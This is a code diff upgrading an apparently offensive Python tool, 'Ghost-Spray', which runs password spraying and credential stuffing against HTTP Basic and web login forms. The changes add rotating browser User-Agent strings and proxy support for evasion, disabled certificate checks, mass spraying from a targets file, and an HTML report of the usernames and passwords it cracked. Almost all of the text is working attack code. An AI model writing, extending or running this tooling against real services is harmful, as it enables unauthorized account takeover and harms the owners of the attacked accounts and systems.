@@ -25,7 +25,17 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import defaultdict
 
-VERSAO = "1.1.0"
+VERSAO = "2.0.0"
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+]
+
+_PROXY = None  # set via --proxy
 
 # ──────────────────────────────────────────────────────────────────
 # BANNER
@@ -288,12 +298,24 @@ class CredVault:
 # Protocolos de ataque
 # ──────────────────────────────────────────────────────────────────
 
+def _build_opener():
+    handlers = []
+    if _PROXY:
+        handlers.append(urllib.request.ProxyHandler({"http": _PROXY, "https": _PROXY}))
+    handlers.append(urllib.request.HTTPSHandler(context=ssl._create_unverified_context()))
+    return urllib.request.build_opener(*handlers)
+
+
 def _testar_http_basic(url, usuario, senha, timeout=5):
     """Testa autenticacao HTTP Basic."""
     cred = base64.b64encode(f"{usuario}:{senha}".encode()).decode()
-    req = urllib.request.Request(url, headers={"Authorization": f"Basic {cred}"})
+    req = urllib.request.Request(url, headers={
+        "Authorization": f"Basic {cred}",
+        "User-Agent": random.choice(USER_AGENTS),
+    })
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        opener = _build_opener()
+        with opener.open(req, timeout=timeout) as r:
             return r.status not in (401, 403), r.status
     except urllib.error.HTTPError as e:
         return e.code not in (401, 403), e.code
@@ -310,9 +332,10 @@ def _testar_http_form(url, usuario_field, senha_field, usuario, senha,
     body = urllib.parse.urlencode(data).encode()
     req = urllib.request.Request(url, data=body, method="POST",
                                  headers={"Content-Type": "application/x-www-form-urlencoded",
-                                          "User-Agent": "Mozilla/5.0"})
+                                          "User-Agent": random.choice(USER_AGENTS)})
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        opener = _build_opener()
+        with opener.open(req, timeout=timeout) as r:
             content = r.read(4096).decode("utf-8", errors="ignore")
             if success_regex:
                 return bool(re.search(success_regex, content, re.IGNORECASE)), r.status
@@ -848,6 +871,60 @@ def gerenciar_vault(acao, vault_senha):
 
 
 # ──────────────────────────────────────────────────────────────────
+# HTML Report
+# ──────────────────────────────────────────────────────────────────
+
+def gerar_html_spray(achados: list, output_path: str, modo: str = "spray"):
+    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+    rows = ""
+    for a in achados:
+        alvo = a.get("alvo", "-")
+        usuario = a.get("usuario", "-")
+        senha = a.get("senha", "-")
+        proto = a.get("protocolo", "-")
+        rows += f"<tr><td>{alvo}</td><td>{usuario}</td><td>{senha}</td><td>{proto}</td></tr>\n"
+    if not rows:
+        rows = "<tr><td colspan='4' style='text-align:center;color:#888'>Nenhuma credencial encontrada</td></tr>"
+    html = f"""<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Ghost-Spray Report</title>
+<style>
+  :root{{--bg:#0d1117;--card:#161b22;--border:#30363d;--green:#39d353;--text:#e6edf3;--muted:#8b949e}}
+  *{{box-sizing:border-box;margin:0;padding:0}}
+  body{{background:var(--bg);color:var(--text);font-family:monospace;padding:2rem}}
+  h1{{color:var(--green);margin-bottom:.5rem}}
+  .meta{{color:var(--muted);font-size:.85rem;margin-bottom:2rem}}
+  .stat{{display:inline-block;background:var(--card);border:1px solid var(--border);border-radius:6px;padding:.8rem 1.5rem;margin-right:1rem;margin-bottom:1rem}}
+  .stat .val{{font-size:2rem;color:var(--green);font-weight:bold}}
+  .stat .lbl{{font-size:.75rem;color:var(--muted)}}
+  table{{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--border);border-radius:6px;overflow:hidden}}
+  th{{background:#1f2937;color:var(--green);padding:.7rem 1rem;text-align:left;font-size:.85rem}}
+  td{{padding:.6rem 1rem;border-top:1px solid var(--border);font-size:.85rem}}
+  tr:hover td{{background:#1a2233}}
+</style>
+</head>
+<body>
+<h1>Ghost-Spray v{VERSAO} - Report</h1>
+<div class="meta">Modo: {modo} | Gerado: {ts} | By Gh0st-Bx1 | github.com/Ghost-Bx1</div>
+<div class="stat"><div class="val">{len(achados)}</div><div class="lbl">Credenciais Encontradas</div></div>
+<br><br>
+<table>
+<thead><tr><th>Alvo</th><th>Usuario</th><th>Senha</th><th>Protocolo</th></tr></thead>
+<tbody>
+{rows}
+</tbody>
+</table>
+</body>
+</html>"""
+    with open(output_path, "w", encoding="utf-8") as f:
+        f.write(html)
+    _log(f"Relatorio HTML salvo: {output_path}", "OK")
+
+
+# ──────────────────────────────────────────────────────────────────
 # CLI / main
 # ──────────────────────────────────────────────────────────────────
 
@@ -871,8 +948,12 @@ def main():
                           help="Delay em segundos entre tentativas (padrao: 1.0)")
     p_spray.add_argument("--threads", type=int, default=3,
                           help="Threads simultaneas por senha (padrao: 3)")
+    p_spray.add_argument("--targets-file", metavar="FILE", help="Arquivo com alvos (um por linha) para spray em massa")
+    p_spray.add_argument("--proxy", metavar="URL", help="Proxy HTTP/HTTPS (ex: http://127.0.0.1:8080)")
     p_spray.add_argument("--vault-pass", help="Senha do vault para salvar credenciais encontradas")
     p_spray.add_argument("--output", "-o", metavar="FILE", help="Salvar resultados em JSON")
+    p_spray.add_argument("--html-output", metavar="FILE", help="Salvar relatorio HTML")
+    p_spray.add_argument("--no-banner", action="store_true", help="Suprimir banner")
     p_spray.add_argument("--verbose", action="store_true", help="Saida detalhada")
 
     # stuff (credential stuffing)
@@ -884,8 +965,11 @@ def main():
                           default="http", help="Protocolo (padrao: http)")
     p_stuff.add_argument("--delay", type=float, default=1.0, help="Delay entre tentativas")
     p_stuff.add_argument("--threads", type=int, default=3, help="Threads simultaneas")
+    p_stuff.add_argument("--proxy", metavar="URL", help="Proxy HTTP/HTTPS (ex: http://127.0.0.1:8080)")
     p_stuff.add_argument("--vault-pass", help="Senha do vault para salvar credenciais")
     p_stuff.add_argument("--output", "-o", metavar="FILE", help="Salvar resultados em JSON")
+    p_stuff.add_argument("--html-output", metavar="FILE", help="Salvar relatorio HTML")
+    p_stuff.add_argument("--no-banner", action="store_true", help="Suprimir banner")
     p_stuff.add_argument("--verbose", action="store_true")
 
     # defaults
@@ -923,7 +1007,15 @@ def main():
         parser.print_help()
         sys.exit(0)
 
-    print(BANNER)
+    no_banner = getattr(args, "no_banner", False)
+    if not no_banner:
+        print(BANNER)
+
+    proxy = getattr(args, "proxy", None)
+    if proxy:
+        global _PROXY
+        _PROXY = proxy
+        _log(f"Proxy ativo: {proxy}", "INFO")
 
     if args.modo == "spray":
         # Carregar usuarios
@@ -946,18 +1038,36 @@ def main():
             senhas = SENHAS_COMUNS
             _log(f"Usando lista interna de {len(senhas)} senhas comuns", "INFO")
 
-        achados = password_spray(
-            args.target, usuarios, senhas,
-            protocolo=args.protocol, delay=args.delay,
-            threads=args.threads, vault_senha=args.vault_pass,
-            verbose=args.verbose
-        )
+        # Alvos: --target e/ou --targets-file
+        alvos = [args.target]
+        if getattr(args, "targets_file", None):
+            try:
+                with open(args.targets_file, "r", encoding="utf-8", errors="ignore") as f:
+                    alvos += [l.strip() for l in f if l.strip() and not l.startswith("#")]
+            except Exception as e:
+                _log(f"Erro ao ler targets-file: {e}", "ALERTA")
+        alvos = list(dict.fromkeys(alvos))
+
+        todos_achados = []
+        for alvo in alvos:
+            if len(alvos) > 1:
+                _log(f"Spraying alvo: {alvo}", "INFO")
+            achados = password_spray(
+                alvo, usuarios, senhas,
+                protocolo=args.protocol, delay=args.delay,
+                threads=args.threads, vault_senha=args.vault_pass,
+                verbose=args.verbose
+            )
+            todos_achados.extend(achados)
+        achados = todos_achados
 
         if args.output and achados:
             with open(args.output, "w") as f:
                 json.dump({"ferramenta": "ghost-spray", "modo": "spray",
                            "achados": achados}, f, indent=2)
             _log(f"Resultados salvos: {args.output}", "OK")
+        if getattr(args, "html_output", None):
+            gerar_html_spray(achados, args.html_output, modo="spray")
 
     elif args.modo == "stuff":
         achados = credential_stuffing(
@@ -971,6 +1081,8 @@ def main():
                 json.dump({"ferramenta": "ghost-spray", "modo": "stuffing",
                            "achados": achados}, f, indent=2)
             _log(f"Resultados salvos: {args.output}", "OK")
+        if getattr(args, "html_output", None):
+            gerar_html_spray(achados, args.html_output, modo="stuffing")
 
     elif args.modo == "defaults":
         achados = verificar_credenciais_padrao(args.target, protocolo=args.protocol)
